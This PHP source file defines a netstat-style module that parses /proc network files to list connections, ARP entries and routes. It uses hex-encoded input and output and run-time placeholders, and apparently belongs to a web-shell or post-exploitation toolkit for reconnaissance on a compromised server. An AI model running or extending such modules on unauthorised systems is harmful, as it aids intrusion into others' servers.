#<?php


class Module_netstat
{
    private $SUCC_CODE        = 0;
    private $ERR_CODE         = 1;

    private $FIELD_SEPARATOR  = ",";
    private $VALUE_SEPARATOR  = "=";

    private $RESPONSE_STATUS  = "status";
    private $RESPONSE_MESSAGE = "message";

    private $return_code;

    public function __construct($cwd)
    {
        $this->return_code = $this->SUCC_CODE;
        $cwd = $this->normalizePath($cwd);
        chdir($cwd);
    }

    private function normalizePath($currPath)
    {
        $currPath = str_replace("\"", "", $currPath);
        $currPath = str_replace("'", "", $currPath);
        $currPath = str_replace("\\", "/", $currPath);
        return $currPath;
    }

    private function parseArgs($args)
    {
        preg_match_all('/"[^"]+"|\'[^\']+\'|\S+/', $args, $matches);
        return $matches[0];
    }

    private function generateResponse($result)
    {
        $response  = "";
        $response .= $this->RESPONSE_STATUS . $this->VALUE_SEPARATOR . $this->return_code;
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->RESPONSE_MESSAGE . $this->VALUE_SEPARATOR . bin2hex($result);
        return bin2hex($response);
    }

    private function reverseAddr($addr)
    {
        $e = explode(".", $addr);
        $re = array_reverse($e);
        return implode(".", $re);
    }

    private function parseNetFile($filepath, $proto)
    {
        $result = "";
        $netfilecontent = @file_get_contents($filepath);
        $lines = explode("\n",$netfilecontent);

        $lines = array_slice($lines, 1, -1);
        
        foreach ($lines as $line)
        {
            $fields = explode(" ", trim($line));

            if (sizeof($fields) >= 3) {
                $laddr_arr = explode(":", $fields[1]);
                $raddr_arr = explode(":", $fields[2]);

                $laddr_ip = $this->reverseAddr(long2ip(hexdec($laddr_arr[0])));
                $laddr_port = $this->reverseAddr(hexdec($laddr_arr[1]));
                $raddr_ip = $this->reverseAddr(long2ip(hexdec($raddr_arr[0])));
                $raddr_port = $this->reverseAddr(hexdec($raddr_arr[1]));

                $result .= "$proto\t$laddr_ip:$laddr_port\t$raddr_ip:$raddr_port" . PHP_EOL;
            }
        }
        return $result;
    }

    private function parseRouteFile($filepath)
    {
        $result = "";
        $netfilecontent = @file_get_contents($filepath);
        $lines = explode("\n",$netfilecontent);

        $lines = array_slice($lines, 1);
        foreach ($lines as $line)
        {
            $fields = explode("\t", trim($line));

            if (sizeof($fields) === 11)
            { 
                $iface = $fields[0];
                $destination = $this->reverseAddr(long2ip(hexdec($fields[1])));
                $gateway = $this->reverseAddr(long2ip(hexdec($fields[2])));
                $mask = $this->reverseAddr(long2ip(hexdec($fields[7])));

                $result .= "$iface\t$destination\t$gateway\t$mask" . PHP_EOL;
            }
        }
        return $result;
    }

    private function parseArpFile($filepath)
    {
        $result = "";
        $netfilecontent = @file_get_contents($filepath);
        $lines = explode("\n",$netfilecontent);

        $lines = array_slice($lines, 1);
        foreach ($lines as $line)
        {
            $line = preg_replace('!\s+!', ' ', $line);
            $fields = explode(" ", trim($line));

            if (sizeof($fields) === 6)
            {                
                $iface = $fields[5];
                $address = $fields[0];
                $hwaddress = $fields[3];

                $result .= "$iface\t$address\t$hwaddress" . PHP_EOL;
            }            
        }
        return $result;
    }

    public function execute($args)
    {
        $result = "";

        try
        {
            $parsed_args = $this->parseArgs(hex2bin($args));

            if (sizeof($parsed_args) !== 1)
            {
                $this->return_code = $this->ERR_CODE;
                throw new Exception("Invalid arguments provided. Use netstat -[l|a|r]");
            }

            $option = $parsed_args[0];

            switch ($option)
            {
                case '-l':
                    $result .= "Proto\tLocal Address\tForeign Address" . PHP_EOL;
                    $result .= $this->parseNetFile("/proc/net/tcp", "tcp");
                    $result .= $this->parseNetFile("/proc/net/udp", "udp");
                    break;
                case '-a':
                    $result .= "Iface\tAddress\tHWaddress" . PHP_EOL;
                    $result .= $this->parseArpFile("/proc/net/arp");
                    break;
                case '-r':
                    $result .= "Iface\tDestination\tGateway\tMask" . PHP_EOL;
                    $result .= $this->parseRouteFile("/proc/net/route");
                    break;              
                default:
                    $this->return_code = $this->ERR_CODE;
                    throw new Exception("Invalid argument '$option'. Use netstat -[l|a|r]");
            }
        }
        catch (Exception $e)
        {
            $this->return_code = $this->ERR_CODE;
            $result = $e->getMessage();
        }

        return $this->generateResponse($result);
    }
}


$cwd = '#{CWD}';
$args = '#{ARGS}';
$module = new Module_netstat($cwd);
print($module->execute($args));